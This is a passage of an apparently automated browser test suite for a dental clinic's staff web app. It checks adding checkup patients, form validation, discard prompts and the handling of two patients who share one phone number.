  await partly.locator('.alert[role="alert"]').waitFor();
  assert.match(await partly.locator('.alert[role="alert"]').innerText(), /^Nophone Desk Person \(no phone\) is already on today's list for North Nazimabad\. The same person\? Then they are on the list already: press Cancel\.\s+Someone else\? Add Nophone Desk Person Rizvi as someone else$/);
  await partly.getByRole('button', { name: 'Add Nophone Desk Person Rizvi as someone else' }).click();
  await page.waitForSelector('.toast:has-text("Nophone Desk Person Rizvi added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  // leave the list as it was
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  for (const who of ['Twice Typed Person', 'Twice Typed Brother', 'Nophone Desk Person', 'Nophone Desk Person Rizvi']) {
    const row = checkupRow(page, who);
    await row.waitFor();
    await removeCheckup(page, row);
  }
});
await step('front desk: the token of a checkup row can be typed and saved (a website checkup has none until someone writes one)', async () => {
  const row = checkupRow(page, 'Bareera Khalid');
  const token = row.locator('input[aria-label^="Token of checkup patient"]');
  await token.waitFor();
  assert.equal(await token.inputValue(), '', 'no token yet');
  await token.fill('9');
  await token.press('Tab');
  await page.waitForTimeout(1200);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Token of checkup patient"]').inputValue(), '9', 'saved, and still there after the list is read again');
  await row.locator('input[aria-label^="Token of checkup patient"]').fill('');
  await row.locator('input[aria-label^="Token of checkup patient"]').press('Tab');
  await page.waitForTimeout(1200);
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Token of checkup patient"]').inputValue(), '', 'and can be cleared');
});
await step('front desk: the top search tells where a checkup patient is (no Mr#), with a link to the Checkups page', async () => {
  await page.getByLabel('Search patients').fill('Bareera');
  const results = page.locator('.search-results:has-text("No patient matches")');
  await results.waitFor();
  assert.match(await results.innerText(), /Checkup patients have no Mr#/);
  await results.getByRole('link', { name: 'Look on the Checkups page' }).click();
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.waitForFunction(() => {
    const rows = [...document.querySelectorAll('table.checkup-table tbody tr[data-id]')];
    return rows.length > 0 && rows.every((t) => t.textContent.includes('Bareera'));
  });
  assert.match(await page.evaluate(() => location.hash), /checkups[?]q=Bareera/);
  // a phone number is carried over as its digits (4 or more)
  await page.getByLabel('Search patients').fill('0300-5550701');
  const again = page.locator('.search-results:has-text("No patient matches")');
  await again.waitFor();
  assert.match(await again.getByRole('link', { name: 'Look on the Checkups page' }).getAttribute('href'), /checkups[?]q=03005550701$/);
  await page.getByLabel('Search patients').fill('');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
});

// ------------------------------------------------------------- "+ Add checkup patient" on the Today page (owner, 15 Oct 2026: name and mobile only)
await step('Today page (the first page after login): "+ Add checkup patient" asks only the name and the mobile number; the name goes on today\'s Aaj ki List as Waiting; the same person is not added twice; a patient file of that phone is named with a link', async () => {
  await page.locator('.topnav a:has-text("Today")').click();
  const panel = page.locator('section.today-checkup');
  await panel.waitFor();
  assert.match(await panel.innerText(), /Checkup patient\?/);
  assert.match(await panel.innerText(), /Write the name and mobile number: the name goes on today's Aaj ki List\. After the checkup, the checkup form is filled in from their row there \("Fill in form", or Options\)\./);
  assert.match(await panel.innerText(), /\d+ checkup patients? on today's lists so far\./);
  const count = async () => Number((await panel.innerText()).match(/(\d+) checkup patients? on today/)[1]);
  const before = await count();
  await panel.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = page.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('h2').innerText(), 'Add a checkup patient');
  assert.deepEqual(await quickFields(m), ['Patient full name', 'Mobile number'], 'a front desk limited to one branch: its branch, not asked');
  assert.equal(await m.locator('fieldset, input[type=checkbox], input[type=radio], details, select').count(), 0, 'none of the checkup form\'s questions');
  assert.deepEqual(await m.locator('.modal-actions button').allInnerTexts(), ['Cancel', 'Add to the list']);
  assert.equal(await page.evaluate(() => document.activeElement?.closest('.field')?.querySelector('.field-label')?.firstChild.textContent), 'Patient full name', 'the cursor starts in the name');
  await shot(page, '19-checkup-quick-add');
  await m.getByLabel(/^Patient full name/).fill('Today Quick Person');
  await m.getByLabel(/^Mobile number/).fill('0300 5550960');
  await m.getByLabel(/^Mobile number/).press('Enter');
  await page.waitForSelector('.toast:has-text("Today Quick Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await reloadAsks(page), false, 'saved: a reload is not asked about');
  assert.equal(await count(), before + 1, 'the count on the Today page goes up');
  // the same person again: said plainly, and not added
  await panel.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.getByLabel(/^Patient full name/).fill('Today Quick Person');
  await m.getByLabel(/^Mobile number/).fill('03005550960');
  await m.getByRole('button', { name: 'Add to the list' }).click();
  await m.locator('.alert[role="alert"]').waitFor();
  assert.equal((await m.locator('.alert[role="alert"]').innerText()).trim(), "Today Quick Person (0300 5550960) is already on today's list for North Nazimabad, so they are not added again.");
  await m.getByRole('button', { name: 'Cancel' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await count(), before + 1, 'not one more');
  // a phone of a patient file: named, with a link to the file; the note stays out of the way (Enter still adds the checkup, one press)
  await panel.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.getByLabel(/^Patient full name/).fill('Today File Person');
  await m.getByLabel(/^Mobile number/).fill('03010734521');
  await m.locator('.alert-warning:has-text("This person already has a patient file")').waitFor();
  assert.ok(await m.getByRole('link', { name: 'Open the patient file' }).count(), 'a link to the file');
  await m.getByLabel(/^Mobile number/).press('Enter');
  await page.waitForSelector('.toast:has-text("Today File Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await count(), before + 2, 'added with the note showing');
  // on the branch's Aaj ki List for today: Waiting, with "Fill in form" on the row
  await page.goto(BASE + '#/staff/sheet');
  const row = checkupRow(page, 'Today Quick Person');
  await row.waitFor();
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting');
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Checkup');
  assert.ok(await row.getByRole('button', { name: 'Fill in form for Today Quick Person' }).isVisible());
  await removeCheckup(page, row);
  await removeCheckup(page, checkupRow(page, 'Today File Person'));
});
// The whole form ("Checkup Patient Form 2.0", owner 11 Oct 2026) stays on the Checkups page, with a date for an earlier day.
await step('Checkups page: "+ Add checkup patient" opens the whole checkup form with its nine questions in the form\'s order', async () => {
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = page.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('h2').innerText(), 'Add a checkup patient');
  const questions = await m.locator('.checkup-form').evaluate((el) => [...el.querySelectorAll('.field-label, legend')].filter((x) => !x.closest('[hidden]')).map((x) => x.firstChild.textContent.trim()));
  assert.deepEqual(questions, ['Patient full name', 'Which branch did you visit?', 'Mobile number', 'Who did your checkup?', 'Did Dr. Ali recommend your treatment?',
    'What was your checkup for?', 'Did you understand the pricing details?', 'Would you like to start the treatment?', 'If yes, then when? If no, then why not?']);
  assert.equal(await m.getByLabel(/^Which branch did you visit/).inputValue(), 'North Nazimabad', 'a front desk limited to one branch: that branch, not asked');
  // tick boxes, several at once, as on the Google Form (a checkup for braces and an extraction; two doctors). The website's doctors of the
  // branch's city (North Nazimabad: Karachi) and those of no city, then Other; the doctors of other cities behind a button.
  const docs = await page.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.clinicians.filter((c) => c.is_doctor && c.active !== false).map((c) => ({ name: c.display_name, region: c.region || null })); });
  const karachi = docs.filter((c) => !c.region || c.region === 'KHI').map((c) => c.name);
  const elsewhere = docs.filter((c) => c.region && c.region !== 'KHI').map((c) => c.name);
  assert.ok(elsewhere.length, 'the demo has doctors of other cities');
  assert.deepEqual(await tickLabels(doctorGroup(m)), [...karachi, 'Other'], "the website's doctors of Karachi and of no city, then Other");
  const more = doctorGroup(m).getByRole('button', { name: /doctors of other cities/ });
  assert.deepEqual([await more.innerText(), await more.getAttribute('aria-expanded')], [`Show doctors of other cities (${elsewhere.length})`, 'false']);
  await more.click();
  assert.deepEqual(await tickLabels(doctorGroup(m)), [...karachi, ...elsewhere, 'Other'], 'every doctor after the button, the other cities after Karachi');
  assert.deepEqual([await more.innerText(), await more.getAttribute('aria-expanded')], ['Hide doctors of other cities', 'true']);
  await more.click();
  assert.deepEqual(await tickLabels(doctorGroup(m)), [...karachi, 'Other']);
  assert.deepEqual(await tickLabels(forGroup(m)), ['Braces', 'General checkup', 'Smile makeover', 'Scaling and polishing', 'Root canal', 'Extraction', 'Crown / bridge', 'Implant',
    'Wisdom tooth / extraction', 'Other'], "the Google Form's choices, in its order");
  assert.deepEqual([await ticked(doctorGroup(m)), await ticked(forGroup(m))], [[], []], 'nothing ticked for a new checkup');
  assert.match(await forGroup(m).locator('legend').innerText(), /required/);
  assert.deepEqual(await m.getByRole('group', { name: /^Did you understand the pricing details/ }).getByRole('radio').evaluateAll((els) => els.map((e) => e.labels[0].textContent.trim())),
    ['Yes', 'No', 'Needs clearer explanation']);
  assert.equal(await m.getByLabel(/^If yes, then when/).getAttribute('maxlength'), '500');
  assert.equal(await m.locator('details.form-more').evaluate((el) => el.open), false, 'date, follow-up, details and notes wait under "More (optional)"');
  await shot(page, '19-checkup-form');
});
await step('Checkups page: the checkup form says what is missing; "Other" opens a text box that must be filled', async () => {
  const m = page.locator('.modal');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await m.locator('.field-error').first().waitFor();
  assert.deepEqual(await m.locator('.field-error').allInnerTexts(), ['Write the patient name.', 'Write a full phone number with at least 10 digits, e.g. 0300 1234567.',
    'Choose who did the checkup.', 'Choose whether Dr. Ali recommended the treatment.', 'Choose what the checkup was for.', 'Choose whether the pricing was understood.',
    'Choose whether they want to start the treatment.', 'Write when they want to start, or why not.']);
  assert.equal(await page.evaluate(() => document.activeElement?.closest('.field')?.querySelector('.field-label')?.firstChild.textContent), 'Patient full name', 'focus on the first one');
  assert.equal(await m.getByLabel(/^Other: who did the checkup/).isVisible(), false, 'no text box until Other is chosen');
  await doctorGroup(m).getByLabel('Other', { exact: true }).check();
  await forGroup(m).getByLabel('Other', { exact: true }).check();
  assert.ok(await m.getByLabel(/^Other: who did the checkup/).isVisible() && await m.getByLabel(/^Other: what was the checkup for/).isVisible());
  assert.equal(await m.locator('.field-error:has-text("Choose who did the checkup.")').count(), 0, 'a tick clears the error of its question');
  await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel('No', { exact: true }).check();
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await m.locator('.field-error:has-text("Write who did the checkup.")').waitFor();
  assert.ok(await m.locator('.field-error:has-text("Write what the checkup was for.")').count());
  assert.equal(await m.locator('.field-error:has-text("Dr. Ali recommended")').count(), 0, 'a choice clears the error of its question');
  // the ticked choices and the Other text are kept together in the list's 300 characters
  await m.getByLabel(/^Other: what was the checkup for/).fill('x'.repeat(295));   // ("Braces, " and 295 letters: 303)
  await forGroup(m).getByLabel('Braces', { exact: true }).check();
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await m.locator('.field-error:has-text("Too long: the ticked choices and the Other text together can have at most 300 characters.")').waitFor();
  await forGroup(m).getByLabel('Braces', { exact: true }).uncheck();
  await m.getByLabel(/^Other: what was the checkup for/).fill('');
  // a form with answers in it is not thrown away by Escape or the × without asking; "Keep filling in" keeps every answer
  const ask = page.locator('.modal', { hasText: 'Discard this checkup form?' });
  await page.keyboard.press('Escape');
  await ask.waitFor();
  assert.equal(await page.evaluate(() => document.activeElement?.textContent), 'Keep filling in', 'the safe choice has focus');
  await ask.getByRole('button', { name: 'Keep filling in' }).click();
  await ask.waitFor({ state: 'detached' });
  assert.deepEqual(await ticked(doctorGroup(m)), ['Other'], 'the answers are still there');
  assert.ok(await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel('No', { exact: true }).isChecked());
  await m.getByRole('button', { name: 'Close' }).click();
  assert.deepEqual([await ask.locator('h2').innerText(), await ask.locator('.modal-body').innerText()], ['Discard this checkup form?', 'Your answers are not saved.']);
  await ask.getByRole('button', { name: 'Discard' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  // an untouched form closes at once
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.waitFor();
  await page.keyboard.press('Escape');
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.waitFor();
  await m.getByRole('button', { name: 'Cancel' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
});
// The form is filled in on phones all day, and the patient may have left by the time the answers are lost: Cancel, the phone's Back, a link
// (a menu link, or "Open the patient file" in the form's warning) and a reload ask too. "Keep filling in" keeps the page, its address and
// every answer; Discard goes where the person was going.
await step('Checkups page: Cancel, Back, a menu link, "Open the patient file" and a reload ask before typed answers are thrown away; Discard then goes on', async () => {
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr');
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  const addBtn = page.getByRole('button', { name: '+ Add checkup patient' });
  const m = page.locator('.modal').first();
  const ask = page.locator('.modal', { hasText: 'Discard this checkup form?' });
  const hash = () => page.evaluate(() => location.hash);
  const menuLink = () => page.evaluate(() => [...document.querySelectorAll('.topnav a')].find((a) => a.textContent.trim() === 'Today').click());   // (out of reach of a tap under the dialog)
  const keep = async (how) => {
    await ask.waitFor();
    assert.match(await ask.innerText(), /Your answers are not saved\./, how);
    assert.equal(await page.evaluate(() => document.activeElement?.textContent), 'Keep filling in', `${how}: the safe choice has focus`);
    await ask.getByRole('button', { name: 'Keep filling in' }).click();
    await ask.waitFor({ state: 'detached' });
    assert.equal(await m.getByLabel(/^Patient full name/).inputValue(), 'Leave Test Person', `${how}: the answers are still there`);
    assert.ok(await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel('Yes', { exact: true }).isChecked(), how);
    assert.match(await hash(), /^#\/staff\/checkups/, `${how}: still on the Checkups page`);
  };
  await addBtn.click();
  await m.waitFor();
  assert.equal(await reloadAsks(page), false, 'an untouched form: a reload is not asked about');
  await m.getByLabel(/^Patient full name/).fill('Leave Test Person');
  await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel('Yes', { exact: true }).check();
  assert.equal(await reloadAsks(page), true, "typed answers: a reload or closing the tab gets the browser's own question");
  await m.getByRole('button', { name: 'Cancel' }).click();
  await keep('Cancel');
  await page.goBack();
  await ask.waitFor();
  await page.goBack();   // Back again while it asks: still one question
  await page.waitForTimeout(200);
  assert.equal(await ask.count(), 1, 'one question at a time');
  await keep('Back');
  await menuLink();
  await keep('a menu link');
  await m.getByLabel(/^Mobile number/).fill('03010734521');   // (a phone that has a patient file: the warning offers to open it)
  await m.getByLabel(/^Mobile number/).press('Tab');
  await m.getByRole('link', { name: 'Open the patient file' }).click();
  await keep('Open the patient file');
  assert.equal(await page.locator('.modal').count(), 1, 'only the form is open');
  // Discard after Back: the page Back was going to (the Aaj ki List); Forward comes back to the Checkups page, so the history is as it was
  await page.goBack();
  await ask.getByRole('button', { name: 'Discard' }).click();
  await page.waitForSelector('table.sheet tbody tr');
  assert.match(await hash(), /^#\/staff\/sheet/);
  assert.equal(await page.locator('.modal').count(), 0);
  assert.equal(await reloadAsks(page), false, 'the form is gone: a reload is not asked about');
  await page.goForward();
  await page.waitForSelector('h1:has-text("Checkups")');
  assert.match(await hash(), /^#\/staff\/checkups/);
  // Discard after a menu link: that page
  await addBtn.click();
  await m.getByLabel(/^Patient full name/).fill('Leave Test Person');
  await menuLink();
  await ask.getByRole('button', { name: 'Discard' }).click();
  await page.locator('section.today-checkup').waitFor();
  assert.equal(await hash(), '#/staff/today');
  assert.equal(await page.locator('.modal').count(), 0);
  // Discard after Cancel: closed, nothing saved
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  await addBtn.click();
  await m.getByLabel(/^Patient full name/).fill('Leave Test Person');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await ask.getByRole('button', { name: 'Discard' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  assert.match(await hash(), /^#\/staff\/checkups/);
  assert.equal(await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listDayCheckups({ branchId: 2, date: localISO() })).filter((c) => c.patient_name === 'Leave Test Person').length;
  }), 0, 'nothing was added');
});
await step('Checkups page: a checkup saved from the whole form is on the Checkups page with its answers, and on the branch\'s Aaj ki List for today (Completed, no "Fill in form")', async () => {
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = page.locator('.modal');
  await fillCheckupForm(m, { name: 'Form Two Person', phone: '0300 5550961', doctorOther: 'Dr. Visiting (sample)', forOther: 'Gum treatment',
    ali: 'Yes', pricing: 'Needs clearer explanation', wants: 'Yes', plan: 'After Eid, in installments' });
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await page.waitForSelector('.toast:has-text("Form Two Person added as a checkup patient.")');
  assert.equal(await page.locator('.modal').count(), 0, 'saved without a question');
  assert.equal(await reloadAsks(page), false, 'and a reload is not asked about');
  await page.goto(BASE + '#/staff/checkups?q=Form%20Two%20Person');
  const row = page.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Form Two Person' });
  await row.waitFor();
  const cells = await row.locator('td').allInnerTexts();
  const heads = (await page.locator('table.checkup-table thead th').allInnerTexts()).map((t) => t.trim());
  const cell = (label) => { const i = heads.indexOf(label); return cells[i > 1 ? i - 1 : i]; };   // (the Patient column is the row's th, not a td)
  assert.match(cell('Treatment').trim(), /^Gum treatment\nDr\. Visiting \(sample\)\nDr\. Ali recommended: Yes\nUnderstood pricing: Needs clearer explanation$/);
  assert.equal(cell('Wants to start').trim(), 'Yes');
  assert.equal(cell('When / why not').trim(), 'After Eid, in installments');
  assert.match(cell('Branch'), /North Nazimabad/);
  assert.match(cell('Date'), new RegExp(await page.evaluate(async () => { const { shortDate, localISO } = await import('/js/ui/dom.js'); return shortDate(localISO()); })));
  assert.match(cell('Source'), /Website/);
  await page.goto(BASE + '#/staff/sheet');
  const onList = checkupRow(page, 'Form Two Person');
  await onList.waitFor();
  assert.equal(await onList.locator('input[aria-label^="Treatment for"]').inputValue(), 'Gum treatment');
  assert.equal(await onList.locator('input[aria-label^="Doctor\'s name for"]').inputValue(), 'Dr. Visiting (sample)');
  assert.equal(await onList.locator('select[aria-label^="Status for"]').inputValue(), 'completed', 'Completed (the answers are given after the checkup), so a row deleted in the Google Sheet keeps it');
  assert.equal(await onList.getByRole('button', { name: /^Fill in form/ }).count(), 0, 'the form is filled in already: no "Fill in form" on the row');
  await onList.getByRole('button', { name: /Checkup options/ }).click();
  assert.equal(await page.locator('.modal').getByRole('button', { name: 'Fill in the checkup form' }).count(), 0, 'nor in its Options');
  const opts = await page.locator('.modal').innerText();
  assert.match(opts, /Wants to start\s+Yes/);
  assert.match(opts, /When \/ why not\s+After Eid, in installments/);
  assert.match(opts, /Understood pricing\s+Needs clearer explanation/);
  await page.keyboard.press('Escape');
  await page.waitForSelector('.modal', { state: 'detached' });
});
// The clinic's usual order: the person is typed into the Google Sheet (or the list) on arrival, the form is filled in after the checkup.
// (Salma Nadeem is the demo's checkup from the Google Sheet on today's North Nazimabad list, with no answers.)
await step('Checkups page: the whole form for someone already on today\'s list (typed into the Google Sheet on arrival) saves the answers on that checkup, not a second one', async () => {
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  const onToday = () => page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listDayCheckups({ branchId: 2, date: localISO() })).length;
  });
  const before = await onToday();
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = page.locator('.modal').first();
  await m.getByLabel(/^Mobile number/).fill('0300-5550702');
  await m.getByLabel(/^Mobile number/).press('Tab');
  const warning = m.locator('.alert-warning', { hasText: 'Already on the list for' });
  await warning.waitFor();   // (it opens above the questions: wait for it before answering them)
  await fillCheckupForm(m, { name: 'Salma Nadeem', checkupFor: 'Braces', ali: 'No', pricing: 'Yes', wants: 'No', plan: 'Will ask her husband first' });
  assert.match(await warning.innerText(), /Salma Nadeem \(0300-5550702\)\. Same person\? Save the answers on this checkup, so they are not on the list twice\./);
  // "Add checkup patient" with the warning out of sight asks once more; "Go back" goes to the warning's button
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  const again = page.locator('.modal', { hasText: 'with this phone number' });
  await again.waitFor();
  assert.match(await again.innerText(), /Salma Nadeem \(0300-5550702\) is already on the list for .+ with this phone number\./);
  assert.deepEqual(await again.locator('.modal-actions button').allInnerTexts(), ['Go back', 'Add as a different person', 'Save the answers on that checkup']);
  await again.getByRole('button', { name: 'Go back' }).click();
  await again.waitFor({ state: 'detached' });
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Save the answers on this checkup: Salma Nadeem');
  await warning.getByRole('button', { name: /^Save the answers on this checkup/ }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForSelector(".toast:has-text(\"Answers saved on Salma Nadeem's checkup.\")");
  assert.equal(await onToday(), before, 'not one more checkup patient');
  // one Salma on the Aaj ki List (Completed, with the answers) and one on the Checkups page
  await page.goto(BASE + '#/staff/sheet');
  await checkupRow(page, 'Salma Nadeem').waitFor();
  assert.equal(await checkupRow(page, 'Salma Nadeem').count(), 1, 'one row, not two');
  const row = checkupRow(page, 'Salma Nadeem');
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Braces');
  assert.equal(await row.locator('input[aria-label^="Token of checkup patient"]').inputValue(), '7', 'the sheet\'s own cells stay (its token)');
  await row.getByRole('button', { name: /Checkup options/ }).click();
  const opts = await page.locator('.modal').innerText();
  assert.match(opts, /Wants to start\s+No/);
  assert.match(opts, /When \/ why not\s+Will ask her husband first/);
  await page.keyboard.press('Escape');
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.goto(BASE + '#/staff/checkups?q=5550702');
  await page.waitForFunction(() => document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false' && document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 0);
  const found = page.locator('table.checkup-table tbody tr[data-id]');
  assert.equal(await found.count(), 1, 'one checkup on the Checkups page');
  assert.match(await found.innerText(), /Google Sheet/);
  assert.match(await found.innerText(), /Will ask her husband first/);
  assert.match(await found.innerText(), /Dr\. Ali recommended: No/);
});
// A parent's phone is often given for two children (in the owner's Google Form file 11 days have two names on one phone): as in the import,
// two names on one phone on one day are two checkups, and the first person's answers are never replaced by pressing Enter.
await step('Checkups page: two names on one phone on one day (a parent\'s phone) are two checkups; "Add as a different person" has focus and the first person\'s answers stay', async () => {
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  const addBtn = page.getByRole('button', { name: '+ Add checkup patient' });
  await addBtn.click();
  const m = page.locator('.modal').first();
  await fillCheckupForm(m, { name: 'Sample Mother Review', phone: '0300 5550990', checkupFor: 'Braces', wants: 'Yes', plan: 'Mother plan' });
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await page.waitForSelector('.toast:has-text("Sample Mother Review added as a checkup patient.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  // the son, on his mother's phone
  await addBtn.click();
  await m.getByLabel(/^Mobile number/).fill('0300-555 0990');
  await m.getByLabel(/^Mobile number/).press('Tab');
  const warning = m.locator('.alert-warning', { hasText: 'Already on the list for' });
  await warning.waitFor();
  // (the name first: the warning grows when it names both people, so the boxes below it are ticked after that)
  await m.getByLabel(/^Patient full name/).fill('Sample Son Review');
  await m.getByLabel(/^Patient full name/).press('Tab');
  await page.waitForFunction(() => /You typed Sample Son Review/.test(document.querySelector('.modal .alert-warning')?.textContent || ''));
  await fillCheckupForm(m, { name: 'Sample Son Review', checkupFor: 'Extraction', wants: 'No', plan: 'Son plan' });
  assert.match(await warning.innerText(), /Sample Mother Review \(0300 5550990\)\. You typed Sample Son Review: another person on the same phone \(often a family member\) is added as a checkup of their own\. Its checkup form is already filled in: saving these answers on it would replace them\./);
  assert.ok(await warning.getByRole('button', { name: 'Replace the answers on this checkup: Sample Mother Review' }).count(), 'the warning\'s button says it would replace');
  await warning.scrollIntoViewIfNeeded().catch(() => {});   // (only for the picture: a late duplicate check may draw the warning again)
  await shot(page, 'family-1-warning');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  const ask = page.locator('.modal', { hasText: 'on this phone number' });
  await ask.waitFor();
  assert.match(await ask.innerText(), /You typed Sample Son Review; the list for .+ has Sample Mother Review \(0300 5550990\) on this phone number\./);
  assert.match(await ask.innerText(), /Another person on the same phone \(often a family member\) is added as a checkup of their own\./);
  assert.match(await ask.innerText(), /Sample Mother Review: Its checkup form is already filled in: saving these answers on it would replace them\./);
  assert.deepEqual(await ask.locator('.modal-actions button').allInnerTexts(), ['Go back', 'Add as a different person', 'Replace the answers on that checkup']);
  assert.equal(await page.evaluate(() => document.activeElement?.textContent), 'Add as a different person', 'the safe choice has focus');
  assert.match(await ask.getByRole('button', { name: 'Add as a different person' }).getAttribute('class'), /btn-primary/, 'and is the highlighted one');
  await shot(page, 'family-2-dialog');
  await page.keyboard.press('Enter');
  await page.waitForSelector('.toast:has-text("Sample Son Review added as a checkup patient.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.goto(BASE + '#/staff/checkups?q=5550990');
  await page.waitForFunction(() => document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false' && document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 1);
  const found = page.locator('table.checkup-table tbody tr[data-id]');
  assert.equal(await found.count(), 2, 'two checkups on the Checkups page');
  const mother = found.filter({ hasText: 'Sample Mother Review' });
  const son = found.filter({ hasText: 'Sample Son Review' });
  assert.match(await mother.innerText(), /Mother plan/, 'the mother keeps her own answers');
  assert.doesNotMatch(await mother.innerText(), /Son plan/);
  assert.match(await son.innerText(), /Son plan/);
  await shot(page, 'family-3-result');
  // leave today's list as it was
  await page.goto(BASE + '#/staff/sheet');
  for (const who of ['Sample Mother Review', 'Sample Son Review']) {
    const row = checkupRow(page, who);
    await row.waitFor();
    await row.getByRole('button', { name: /Checkup options/ }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
    await row.waitFor({ state: 'detached' });
  }
  await page.locator('.topnav a:has-text("Today")').click();   // (the next step opens the Aaj ki List afresh)
  await page.locator('section.today-checkup').waitFor();
});
await step('Aaj ki List: a checkup typed in on arrival gets its answers with "Fill in the checkup form" in its Options or "Fill in form" on its row; the button goes once the form is filled in', async () => {
  // two arrivals typed in before the checkup (no answers), as the sheet or the desk makes them
  await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    for (const [name, phone, typed] of [['Arrival Typed Person', '0300 5550962', 'Check up'], ['Arrival Second Person', '0300 5550963', 'Checkup']]) {
      await state.data.addCheckup({ checkup_date: localISO(), branch_id: 2, patient_name: name, phone, checkup_for: typed, day_status: 'waiting', follow_up: 'Not Contacted' });
    }
  });
  await page.goto(BASE + '#/staff/sheet');
  const first = checkupRow(page, 'Arrival Typed Person');
  await first.waitFor();
  await first.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Fill in the checkup form' }).click();
  const m = page.locator('.modal', { hasText: 'Checkup form: Arrival Typed Person' });
  await m.waitFor();
  assert.equal(await m.getByLabel(/^Patient full name/).inputValue(), 'Arrival Typed Person');
  assert.equal(await m.getByLabel(/^Which branch did you visit/).inputValue(), 'North Nazimabad');
  await m.getByRole('button', { name: 'Save the answers' }).click();
  await m.locator('.field-error').first().waitFor();
  assert.deepEqual(await m.locator('.field-error').allInnerTexts(), ['Choose who did the checkup.', 'Choose whether Dr. Ali recommended the treatment.', 'Choose what the checkup was for.',
    'Choose whether the pricing was understood.', 'Choose whether they want to start the treatment.', 'Write when they want to start, or why not.'],
    'every question of the form is asked ("Check up" typed on arrival, a spelling of the word Checkup, is no answer to "What was your checkup for?")');
  // its Cancel asks too once something is ticked
  await doctorGroup(m).getByRole('checkbox').first().check();
  await m.getByRole('button', { name: 'Cancel' }).click();
  const ask = page.locator('.modal', { hasText: 'Discard this checkup form?' });
  await ask.getByRole('button', { name: 'Keep filling in' }).click();
  await ask.waitFor({ state: 'detached' });
  assert.equal((await ticked(doctorGroup(m))).length, 1, 'the tick is still there');
  await fillCheckupForm(m, { name: 'Arrival Typed Person', checkupFor: 'Root canal', ali: 'Yes', pricing: 'No', wants: 'Yes', plan: 'This Saturday' });
  await m.getByRole('button', { name: 'Save the answers' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForSelector(".toast:has-text(\"Answers saved on Arrival Typed Person's checkup.\")");
  assert.equal(await first.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
